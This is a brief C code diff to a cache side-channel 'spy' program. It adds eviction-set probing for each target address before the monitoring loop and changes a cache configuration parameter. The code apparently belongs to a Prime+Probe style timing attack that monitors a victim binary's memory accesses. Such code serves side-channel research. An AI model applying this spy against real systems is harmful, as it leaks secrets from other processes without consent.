@@ -161,6 +161,9 @@ void close_spy(Config *conf, Targets *targets){
 // Monitor target addresses.
 void my_monitor(Config *spy_conf, Targets *targets){
     {
+        for(size_t i=0; i<targets->number; i++){
+            probe_evset_chase(spy_conf, targets->addresses[i]->evset);
+        }
         const char *output_filename = "./output_evict_time.log";
         int ctr=0, *hit_ctr=malloc(targets->number*sizeof(int));
         for(size_t i=0; i<targets->number; i++) hit_ctr[i]=0;
@@ -204,7 +207,7 @@ void my_monitor(Config *spy_conf, Targets *targets){
 }
 
 void spy(char *victim_filepath, char *offset_filepath){
-    Config *spy_conf= config_init(27, 2048, 64, 110, 2097152);
+    Config *spy_conf= config_init(16, 2048, 64, 110, 2097152);
     Targets *targets = init_spy(spy_conf, victim_filepath, offset_filepath);
     printf("[+] spy: spy init complete, monitoring");
     for(size_t i=0; i<targets->number; i++){
